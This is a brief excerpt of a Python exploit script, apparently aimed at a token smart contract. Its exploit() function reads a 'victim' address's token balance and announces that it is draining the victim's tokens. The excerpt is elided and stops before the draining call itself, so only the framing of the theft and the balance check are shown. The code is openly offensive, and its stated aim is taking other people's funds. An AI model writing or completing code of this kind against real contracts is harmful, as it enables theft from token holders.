...
def exploit():
    ...
    # Step 2: Check and drain victim's balance
    print("\n[+] Checking victim's balance...")
    victim_balance = token.functions.balanceOf(args.victim_address).call()
    print(f"Victim balance: {victim_balance}")

    if victim_balance == 0:
        print("Victim has no balance to drain.")
        return

    print("[+] Draining victim's tokens...")
